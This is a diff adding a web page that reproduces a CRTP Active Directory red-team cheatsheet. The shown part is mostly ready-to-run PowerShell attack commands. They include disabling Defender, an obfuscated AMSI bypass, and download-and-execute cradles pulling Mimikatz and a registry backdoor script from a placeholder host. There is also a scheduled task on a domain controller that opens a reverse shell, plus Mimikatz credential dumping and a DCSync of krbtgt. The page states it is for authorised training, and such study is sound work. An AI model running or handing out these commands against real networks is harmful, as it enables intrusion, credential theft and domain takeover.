@@ -1,0 +1,1321 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Mani Bharathi</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="img/favicon.png" rel="icon">
+  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="vendor/aos/aos.css" rel="stylesheet">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="css/style.css" rel="stylesheet">
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <!-- ======= Header ======= -->
+ <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+      
+        <h1 class="text-light"><a href="index-2.html">
+
+          <br>ЖĆØĐ€</a>
+        </a></h1>
+        <div class="social-links mt-3 text-center">
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="index-2.html"   class="nav-link scrollto active"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li><a href="resume.html"  class="nav-link scrollto"><i class="bi bi-file-earmark-text navicon"></i>Resume</a></li>
+          <li><a href="portfolio.html" class="nav-link scrollto"><i class="bi bi-images navicon navicon"></i><span>Portfolio</span></a></li>
+          <li><a href="cheatsheets.html" class="nav-link scrollto"><i class="bi bi-shield-check"></i>Cheatsheets</a></li>
+          <li><a href="Resourses.html" class="nav-link scrollto"><i class="bi bi-router"></i>Start Resources</a></li>
+          <li><a href="https://buymeacoffee.com/xcode96" target="_blank" class="nav-link scrollto"><i class="bi bi-heart navicon"></i>Buy Me a Coffee</a></li> 
+
+  
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>CRTP+ Cheatsheet</h2>
+          <ol>
+            <li><a href="index-2.html">Home</a></li>
+            <li>Certified Read Team Professional CRTP Cheatsheet</li>
+          </ol>  
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <!-- ======= Disclaimer Alert ======= -->
+            <div class="alert alert-danger alert-dismissible fade show" role="alert" data-aos="fade-right">
+              <strong>Disclaimer:</strong> This cheatsheet is provided for educational and authorized security testing
+              purposes only. All techniques, tools, and methods described herein must be used only in environments
+              <strong>you have explicit permission to perform security assessments</strong>. The author(s) of this
+              cheatsheet are not responsible for any misuse or damage resulting from the application of this material.
+              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+            <div class="cheatsheet-content">
+
+  <h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="Certified_Read_Team_Professional_CRTP__Cheatsheet_0"></a>Certified Read Team Professional (CRTP) - Cheatsheet</h1>
+<p class="has-line-data" data-line-start="2" data-line-end="3"><strong>Name</strong> : <strong>CRTP - Active Directory Command Cheat Sheet (Powershell)</strong></p>
+<p class="has-line-data" data-line-start="4" data-line-end="5"><strong>Course Link</strong> : <a href="https://www.alteredsecurity.com/adlab">https://www.alteredsecurity.com/adlab</a></p>
+<p class="has-line-data" data-line-start="6" data-line-end="7"><strong>Compiled By</strong> : <strong>Nikhil Raj ( Twitter: <a href="https://twitter.com/0xn1k5">https://twitter.com/0xn1k5</a> | Blog: <a href="https://organicsecurity.in">https://organicsecurity.in</a> )</strong></p>
+<p class="has-line-data" data-line-start="8" data-line-end="9"><strong>Version: 1.0</strong></p>
+<p class="has-line-data" data-line-start="10" data-line-end="11"><strong>Last Updated</strong> : 23 Sep 2022</p>
+<p class="has-line-data" data-line-start="12" data-line-end="13"><strong>Disclaimer</strong> : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.</p>
+<h1 class="code-line" data-line-start=15 data-line-end=16 ><a id="AV_Evasion_15"></a>AV Evasion</h1>
+<p class="has-line-data" data-line-start="17" data-line-end="18"><strong>Disable MS Defender</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="19" data-line-end="24">
+<p class="has-line-data" data-line-start="19" data-line-end="20">Bypass the execution policy</p>
+<pre><code class="has-line-data" data-line-start="22" data-line-end="24" class="language-powershell">powershell -ep Bypass
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="24" data-line-end="32">
+<p class="has-line-data" data-line-start="24" data-line-end="25">Disable AV using powershell (Requires Local Admin rights)</p>
+<pre><code class="has-line-data" data-line-start="27" data-line-end="32" class="language-powershell">Get-MPPreference
+Set-MPPreference -DisableRealTimeMonitoring <span class="hljs-variable">$true</span>
+Set-MPPreference -DisableIOAVProtection <span class="hljs-variable">$true</span>
+Set-MPPreference -DisableIntrusionPreventionSystem <span class="hljs-variable">$true</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="32" data-line-end="36">
+<p class="has-line-data" data-line-start="32" data-line-end="33">Bypass AMSI Check (If Admin rights are not available)</p>
+<pre><code class="has-line-data" data-line-start="34" data-line-end="36" class="language-powershell">S`eT-It`em ( <span class="hljs-string">'V'</span>+<span class="hljs-string">'aR'</span> +  <span class="hljs-string">'IA'</span> + (<span class="hljs-string">'blE:1'</span>+<span class="hljs-string">'q2'</span>)  + (<span class="hljs-string">'uZ'</span>+<span class="hljs-string">'x'</span>)  ) ( [TYpE](  <span class="hljs-string">"{1}{0}"</span>-F<span class="hljs-string">'F'</span>,<span class="hljs-string">'rE'</span>  ) )  ;    (    Get-varI`A`BLE  ( (<span class="hljs-string">'1Q'</span>+<span class="hljs-string">'2U'</span>)  +<span class="hljs-string">'zX'</span>  )  -VaL  ).<span class="hljs-string">"A`ss`Embly"</span>.<span class="hljs-string">"GET`TY`Pe"</span>((  <span class="hljs-string">"{6}{3}{1}{4}{2}{0}{5}"</span> -f(<span class="hljs-string">'Uti'</span>+<span class="hljs-string">'l'</span>),<span class="hljs-string">'A'</span>,(<span class="hljs-string">'Am'</span>+<span class="hljs-string">'si'</span>),(<span class="hljs-string">'.Man'</span>+<span class="hljs-string">'age'</span>+<span class="hljs-string">'men'</span>+<span class="hljs-string">'t.'</span>),(<span class="hljs-string">'u'</span>+<span class="hljs-string">'to'</span>+<span class="hljs-string">'mation.'</span>),<span class="hljs-string">'s'</span>,(<span class="hljs-string">'Syst'</span>+<span class="hljs-string">'em'</span>)  ) ).<span class="hljs-string">"g`etf`iElD"</span>(  ( <span class="hljs-string">"{0}{2}{1}"</span> -f(<span class="hljs-string">'a'</span>+<span class="hljs-string">'msi'</span>),<span class="hljs-string">'d'</span>,(<span class="hljs-string">'I'</span>+<span class="hljs-string">'nitF'</span>+<span class="hljs-string">'aile'</span>)  ),(  <span class="hljs-string">"{2}{4}{0}{1}{3}"</span> -f (<span class="hljs-string">'S'</span>+<span class="hljs-string">'tat'</span>),<span class="hljs-string">'i'</span>,(<span class="hljs-string">'Non'</span>+<span class="hljs-string">'Publ'</span>+<span class="hljs-string">'i'</span>),<span class="hljs-string">'c'</span>,<span class="hljs-string">'c,'</span>  )).<span class="hljs-string">"sE`T`VaLUE"</span>(  ${n`ULl},${t`RuE} )
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="36" data-line-end="41">
+<p class="has-line-data" data-line-start="36" data-line-end="37">Download and save the file on disk</p>
+<pre><code class="has-line-data" data-line-start="39" data-line-end="41" class="language-powershell">iwr http://<span class="hljs-number">192.168</span>.<span class="hljs-number">100</span>.XX/rubeus.exe -outfile rubeus.exe
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="41" data-line-end="55">
+<p class="has-line-data" data-line-start="41" data-line-end="42">Download and execute cradle (Files can be hosted using HFS.exe or Python Webserver)</p>
+<pre><code class="has-line-data" data-line-start="44" data-line-end="55" class="language-powershell">iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/PowerView.ps1'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/Invoke-Mimikatz.ps1'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/mimilib.dll'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/Set-RemotePSRemoting.ps1'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/Set-RemoteWMI.ps1'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/MS-RPRN.exe'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/Rubeus.exe'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/Add-RemoteRegBackdoor.ps1'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/Find-PSRemotingLocalAdminAccess.ps1'</span>)
+iex (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.100.XX/Find-WMILocalAdminAccess.ps1'</span>)
+
+</code></pre>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=55 data-line-end=56 ><a id="Enumeration_55"></a>Enumeration</h1>
+<p class="has-line-data" data-line-start="57" data-line-end="58"><strong>Domain Enumeration</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="59" data-line-end="63">
+<p class="has-line-data" data-line-start="59" data-line-end="60">Get Basic Information about Domain</p>
+<pre><code class="has-line-data" data-line-start="61" data-line-end="63" class="language-powershell">Get-NetDomain
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="63" data-line-end="67">
+<p class="has-line-data" data-line-start="63" data-line-end="64">Find the SID of the current Domain</p>
+<pre><code class="has-line-data" data-line-start="65" data-line-end="67" class="language-powershell">Get-DomainSID
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="67" data-line-end="72">
+<p class="has-line-data" data-line-start="67" data-line-end="68">Find the policy applicable to current domain</p>
+<pre><code class="has-line-data" data-line-start="69" data-line-end="72" class="language-powershell">Get-DomainPolicy
+(Get-DomainPolicy).<span class="hljs-string">"Kerberos Policy"</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="72" data-line-end="77">
+<p class="has-line-data" data-line-start="72" data-line-end="73">Find the DC Servers in current Domain</p>
+<pre><code class="has-line-data" data-line-start="74" data-line-end="77" class="language-powershell">Get-NetDomainController
+Get-NetDomainController -Forest OrganicSecurity.local
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="77" data-line-end="82">
+<p class="has-line-data" data-line-start="77" data-line-end="78">Enumerate Domain OU</p>
+<pre><code class="has-line-data" data-line-start="79" data-line-end="82" class="language-powershell">Get-NetOU -FullData
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="82" data-line-end="83"><strong>User, Group &amp; Computer Object</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="84" data-line-end="89">
+<p class="has-line-data" data-line-start="84" data-line-end="85">Enumerate the Information about the Domain Users</p>
+<pre><code class="has-line-data" data-line-start="87" data-line-end="89" class="language-powershell">Get-NetDomainUser
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="89" data-line-end="94">
+<p class="has-line-data" data-line-start="89" data-line-end="90">Search the user attributes for specific terms</p>
+<pre><code class="has-line-data" data-line-start="92" data-line-end="94" class="language-powershell">Find-UserField -SearchField Description -SearchTerm <span class="hljs-string">"Password"</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="94" data-line-end="100">
+<p class="has-line-data" data-line-start="94" data-line-end="95">Find all the groups on the Current Domain</p>
+<pre><code class="has-line-data" data-line-start="97" data-line-end="100" class="language-powershell">Get-NetGroup
+Get-NetGroup -Recurse
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="100" data-line-end="105">
+<p class="has-line-data" data-line-start="100" data-line-end="101">Find Group Membership</p>
+<pre><code class="has-line-data" data-line-start="103" data-line-end="105" class="language-powershell">Get-NetGroupMember -GroupName <span class="hljs-string">"EnterPrise Admins"</span> -Domain <span class="hljs-string">"OrganicSecurity.local"</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="105" data-line-end="110">
+<p class="has-line-data" data-line-start="105" data-line-end="106">Find local group created on the servers (requires admin rights for checking on non-dc machines)</p>
+<pre><code class="has-line-data" data-line-start="108" data-line-end="110" class="language-powershell">Get-NetLocalGroup -Computername &lt;dc&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="110" data-line-end="115">
+<p class="has-line-data" data-line-start="110" data-line-end="111">Get the list of Computer Objects</p>
+<pre><code class="has-line-data" data-line-start="113" data-line-end="115" class="language-powershell">Get-NetComputer
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="115" data-line-end="116"><strong>Shares &amp; Juicy Files</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="117" data-line-end="122">
+<p class="has-line-data" data-line-start="117" data-line-end="118">Identify the shares in current domain</p>
+<pre><code class="has-line-data" data-line-start="120" data-line-end="122" class="language-powershell">Invoke-ShareFinder
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="122" data-line-end="127">
+<p class="has-line-data" data-line-start="122" data-line-end="123">Identify juicy files accessible over the shared folder</p>
+<pre><code class="has-line-data" data-line-start="125" data-line-end="127" class="language-powershell">Invoke-FileFinder
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="127" data-line-end="132">
+<p class="has-line-data" data-line-start="127" data-line-end="128">Find File servers in current domain</p>
+<pre><code class="has-line-data" data-line-start="130" data-line-end="132" class="language-powershell">Get-FileNetServer
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="132" data-line-end="137">
+<p class="has-line-data" data-line-start="132" data-line-end="133">Find hardcoded Password via Group Policy Preference</p>
+<pre><code class="has-line-data" data-line-start="135" data-line-end="137" class="language-powershell">findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="137" data-line-end="143">
+<p class="has-line-data" data-line-start="137" data-line-end="138">Decrypt the GPP Password identified in previous step (<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a>)</p>
+<pre><code class="has-line-data" data-line-start="140" data-line-end="143" class="language-powershell">Get-DecryptedCpassword
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="143" data-line-end="144"><strong>User Hunting</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="145" data-line-end="151">
+<p class="has-line-data" data-line-start="145" data-line-end="146">Find session of logged on users on the server</p>
+<pre><code class="has-line-data" data-line-start="148" data-line-end="151" class="language-powershell">Get-NetLoggedOn &lt;computer-name&gt;
+(Get-NetComputer -FullData).foreach({Get-NetLoggedOn <span class="hljs-variable">$_</span>.cn})
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="151" data-line-end="156">
+<p class="has-line-data" data-line-start="151" data-line-end="152">Find last logged on user on the remote machine</p>
+<pre><code class="has-line-data" data-line-start="154" data-line-end="156" class="language-powershell">Get-LastLoggedOn -ComputerName &lt;servername&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="156" data-line-end="161">
+<p class="has-line-data" data-line-start="156" data-line-end="157">Find all the local admin accounts on all the machines (Required Admin rights on non-dc machines)</p>
+<pre><code class="has-line-data" data-line-start="159" data-line-end="161" class="language-powershell">Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="161" data-line-end="168">
+<p class="has-line-data" data-line-start="161" data-line-end="162">Find Local Admin rights for current user</p>
+<pre><code class="has-line-data" data-line-start="164" data-line-end="168" class="language-powershell">Find-LocalAdminAccess
+Invoke-CheckLocalAdminAccess
+Invoke-CheckLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="168" data-line-end="173">
+<p class="has-line-data" data-line-start="168" data-line-end="169">Find the computers where Domain Admin or specified User/Group has active session</p>
+<pre><code class="has-line-data" data-line-start="171" data-line-end="173" class="language-powershell">Invoke-UserHunter
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="173" data-line-end="178">
+<p class="has-line-data" data-line-start="173" data-line-end="174">“stealth” option only checks for session on only High Value Servers</p>
+<pre><code class="has-line-data" data-line-start="176" data-line-end="178" class="language-powershell">Invoke-UserHunter -stealth
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="178" data-line-end="183">
+<p class="has-line-data" data-line-start="178" data-line-end="179">Check for Powershell Remoting access for current user</p>
+<pre><code class="has-line-data" data-line-start="181" data-line-end="183" class="language-powershell">Find-PSRemotingLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="183" data-line-end="189">
+<p class="has-line-data" data-line-start="183" data-line-end="184">Check for Remote Access via WMI for current user</p>
+<pre><code class="has-line-data" data-line-start="186" data-line-end="189" class="language-powershell">Find-WMILocalAdminAccess -ComputerName &lt;server_fqdn&gt;
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="189" data-line-end="190"><strong>GPO Enumeration</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="191" data-line-end="197">
+<p class="has-line-data" data-line-start="191" data-line-end="192">Find all the GPO configured in a given domain</p>
+<pre><code class="has-line-data" data-line-start="194" data-line-end="197" class="language-powershell">Get-NetGPO | select displayname
+Get-NetGPO -ComputerName &lt;server_fqdn&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="197" data-line-end="204">
+<p class="has-line-data" data-line-start="197" data-line-end="198">Find the GPOs applied on a specific OU in the domain</p>
+<pre><code class="has-line-data" data-line-start="200" data-line-end="204" class="language-powershell">Get-NetOU -FullData | select ou,pglink
+Get-NetGPO -GPOName <span class="hljs-string">"{GPO_ID}"</span>
+
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="204" data-line-end="209">
+<p class="has-line-data" data-line-start="204" data-line-end="205">Find If there is GPO configured which is using Restricted Groups via groups.xml to assign local admin membership</p>
+<pre><code class="has-line-data" data-line-start="207" data-line-end="209" class="language-powershell">Get-NetGPOGroup
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="209" data-line-end="215">
+<p class="has-line-data" data-line-start="209" data-line-end="210">Find machines where the given user is member of a specific group</p>
+<pre><code class="has-line-data" data-line-start="212" data-line-end="215" class="language-powershell">Get-GPOLocation -UserName &lt;username&gt; 
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="215" data-line-end="216"><strong>Access Control Model (ACL)</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="217" data-line-end="222">
+<p class="has-line-data" data-line-start="217" data-line-end="218">Fetch all the ACL associated with a given user account</p>
+<pre><code class="has-line-data" data-line-start="220" data-line-end="222" class="language-powershell">Get-ObjectAcl -SamAccountName &lt;username&gt; | select AccessControlType, IdentityReference, ActiveDirectoryRights
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="222" data-line-end="227">
+<p class="has-line-data" data-line-start="222" data-line-end="223">Fetch all the ACL by ADSPath for any AD Object</p>
+<pre><code class="has-line-data" data-line-start="225" data-line-end="227" class="language-powershell">Get-ObjectAcl -ADSPath <span class="hljs-string">"LDAP://CN={73267-86872-368732},CN=Policies,CN=System,DC=organicsecurity,DC=local"</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="227" data-line-end="231">
+<p class="has-line-data" data-line-start="227" data-line-end="228">Fetch all the ACL by ADSPrefix</p>
+<pre><code class="has-line-data" data-line-start="229" data-line-end="231" class="language-powershell">Get-ObjectAcl -ADSPrefix <span class="hljs-string">"CN=Administrator,CN=Users"</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="231" data-line-end="236">
+<p class="has-line-data" data-line-start="231" data-line-end="232">Use below command to find all the interesting ACEs</p>
+<pre><code class="has-line-data" data-line-start="234" data-line-end="236" class="language-powershell">Invoke-ACLScanner | select AccessControlType, IdentityReference, ActiveDirectoryRights, ObjectDN
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="236" data-line-end="241">
+<p class="has-line-data" data-line-start="236" data-line-end="237">Identify the ACL associated with the specified path</p>
+<pre><code class="has-line-data" data-line-start="239" data-line-end="241" class="language-powershell">GetPathAcl -Path <span class="hljs-string">"\\dc.organicsecurity.local\sysvol"</span>
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="241" data-line-end="242"><strong>Forest &amp; Domain Trusts</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="243" data-line-end="248">
+<p class="has-line-data" data-line-start="243" data-line-end="244">Enumerate Trust of current domain</p>
+<pre><code class="has-line-data" data-line-start="246" data-line-end="248" class="language-powershell">Get-NetDomainTrust
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="248" data-line-end="254">
+<p class="has-line-data" data-line-start="248" data-line-end="249">Enumerate Current Forest, and its domain</p>
+<pre><code class="has-line-data" data-line-start="251" data-line-end="254" class="language-powershell">Get-NetForest
+Get-NetForest -Forest organicsecurity.local
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="254" data-line-end="259">
+<p class="has-line-data" data-line-start="254" data-line-end="255">Enumerate all the domains under given forest</p>
+<pre><code class="has-line-data" data-line-start="257" data-line-end="259" class="language-powershell">Get-NetForestDomain
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="259" data-line-end="264">
+<p class="has-line-data" data-line-start="259" data-line-end="260">Find the Global Catalouge for given forest</p>
+<pre><code class="has-line-data" data-line-start="262" data-line-end="264" class="language-powershell">Get-NetForestCatalog
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="264" data-line-end="269">
+<p class="has-line-data" data-line-start="264" data-line-end="265">Find the forest trust</p>
+<pre><code class="has-line-data" data-line-start="267" data-line-end="269" class="language-powershell">Get-NetForestTrust -Forest organicsecurity.local
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="269" data-line-end="270"><strong>BloodHound &amp; SharpHound</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="271" data-line-end="281">
+<p class="has-line-data" data-line-start="271" data-line-end="272">Install neo4j service</p>
+<pre><code class="has-line-data" data-line-start="274" data-line-end="281" class="language-powershell">.\neo4j.bat install-service
+net start neo4j
+
+. .\Sharhound.ps1
+Invoke-BloodHound -CollectionMethod All
+
+
+</code></pre>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=281 data-line-end=282 ><a id="PrivEsc__Misconfiguration__Feature_Abuse_281"></a>PrivEsc - Misconfiguration &amp; Feature Abuse</h1>
+<ul>
+<li class="has-line-data" data-line-start="283" data-line-end="288">
+<p class="has-line-data" data-line-start="283" data-line-end="284">Escalate privilege on local system to gain Admin rights</p>
+<ul>
+<li class="has-line-data" data-line-start="284" data-line-end="285">PowerUp : https <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></li>
+<li class="has-line-data" data-line-start="285" data-line-end="286">BeRoot : https:// <a href="https://github.com/AlessandroZ/BeRoot">github.com/AlessandroZ/BeRoot</a></li>
+<li class="has-line-data" data-line-start="286" data-line-end="288">Privesc : https:// <a href="https://github.com/enjoiz/Privesc">github.com/enjoiz/Privesc</a></li>
+</ul>
+</li>
+<li class="has-line-data" data-line-start="288" data-line-end="297">
+<p class="has-line-data" data-line-start="288" data-line-end="289"><strong>PowerUp</strong></p>
+<pre><code class="has-line-data" data-line-start="291" data-line-end="297" class="language-powershell">Get-ServiceUnquoted
+Invoke-AllChecks
+
+Invoke-ServiceAbuse -Name <span class="hljs-string">'Sevice Name'</span>
+
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="297" data-line-end="309">
+<p class="has-line-data" data-line-start="297" data-line-end="298"><strong>Jenkins</strong></p>
+<pre><code class="has-line-data" data-line-start="300" data-line-end="309" class="language-powershell">.\nc64.exe -l -p <span class="hljs-number">443</span>
+
+schtasks /create /S dc.organicsecurity.local /SC Weekly /RU <span class="hljs-string">"NT Authority\SYSTEM"</span> /TN <span class="hljs-string">"Job01"</span> /TR <span class="hljs-string">"powershell.exe -c 'iex ( iwr http://192.168.100.XX/dakiya.ps1  -UseBasicParsing); Dakiya -Reverse -IPAddress 192.168.100.YY -Port 443'"</span>
+
+schtasks /Run /S dc.organicsecurity.local /TN <span class="hljs-string">"Job01"</span>
+
+schtasks /Query /S dc.organicsecurity.local 
+
+
+</code></pre>
+</li>
+</ul>
+<h1 class="code-line" data-line-start=309 data-line-end=310 ><a id="Lateral_Movement__Persistance_309"></a>Lateral Movement &amp; Persistance</h1>
+<ul>
+<li class="has-line-data" data-line-start="311" data-line-end="324">
+<p class="has-line-data" data-line-start="311" data-line-end="312">Execute command using powershell remoting</p>
+<pre><code class="has-line-data" data-line-start="314" data-line-end="324" class="language-powershell"><span class="hljs-variable">$sess</span> = New-PSSession -ComputerName &lt;computer/list_of_servers&gt;
+Enter-PSSession -<span class="hljs-variable">$sess</span>
+
+Enter-PSSession -ComputerName &lt;server_name&gt;
+
+Invoke-Command -Scriptblock {<span class="hljs-built_in">Get-Process</span>} -ComputerName &lt;computer&gt;
+Invoke-Command -Scriptblock ${<span class="hljs-keyword">function</span>:<span class="hljs-built_in">Get-Process</span>} -ComputerName &lt;computer&gt;
+Invoke-Command -FilePath &lt;script.ps1&gt; -ComputerName &lt;<span class="hljs-built_in">Get-Content</span> computers.txt&gt;
+
+
+</code></pre>
+</li>
+</ul>
+<p class="has-line-data" data-line-start="324" data-line-end="325"><strong>Mimikatz Cheatsheet</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="326" data-line-end="332">
+<p class="has-line-data" data-line-start="326" data-line-end="327">Default Command</p>
+<pre><code class="has-line-data" data-line-start="328" data-line-end="332" class="language-powershell">Invoke-Mimikatz
+Invoke-Mimikatz -DumpCreds
+Invoke-Mimikatz -DumpCreds -ComputerName &lt;comp&gt;
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="332" data-line-end="336">
+<p class="has-line-data" data-line-start="332" data-line-end="333">Use Mimikatz with PowerShell Remoting</p>
+<pre><code class="has-line-data" data-line-start="334" data-line-end="336" class="language-powershell">Invoke-Command -FilePath invoke-mimikatz.ps1 -Session <span class="hljs-variable">$sess</span>  
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="336" data-line-end="341">
+<p class="has-line-data" data-line-start="336" data-line-end="337">Dump credentials from memory (lsass.exe)</p>
+<pre><code class="has-line-data" data-line-start="338" data-line-end="341" class="language-powershell">Invoke-Mimimatz -Command <span class="hljs-string">'"sekurlsa::logonpasswords"'</span>
+Invoke-Mimimatz -Command <span class="hljs-string">'"privilege::debug" "sekurlsa::logonpasswords"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="341" data-line-end="346">
+<p class="has-line-data" data-line-start="341" data-line-end="342">Dump credentials from local SAM account (Contains DSRM Admin creds) &amp; LSA (conatins details from ntds.dat)</p>
+<pre><code class="has-line-data" data-line-start="343" data-line-end="346" class="language-powershell">Invoke-Mimimatz -Command <span class="hljs-string">'"lsadump::sam"'</span>
+Invoke-Mimikatz -Command <span class="hljs-string">'"lsadump::lsa /patch"'</span> -Computername dcorp-dc
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="346" data-line-end="352">
+<p class="has-line-data" data-line-start="346" data-line-end="347">Dump credentials from windows vault</p>
+<pre><code class="has-line-data" data-line-start="349" data-line-end="352" class="language-powershell">  Invoke-Mimimatz -Command <span class="hljs-string">'"token::elevate" "vault::list"'</span>
+  Invoke-Mimimatz -Command <span class="hljs-string">'"token::elevate" "vault::cred /patch"'</span>
+
+</code></pre>
+</li>
+<li class="has-line-data" data-line-start="352" data-line-end="356">
+<p class="has-line-data" data-line-start="352" data-line-end="353">Perform DCSync Attacks (Requires DA Rights) [Mention user in domain\user format only ]</p>
+<pre><code class="has-line-data" data-line-start="354" data-line-end="356" class="language-powershell">Invoke-Mimimatz -Command <span class="hljs-string">'"lsadump::dcsync /user:domain\krbtgt /domain:domain.local"'</span>
+
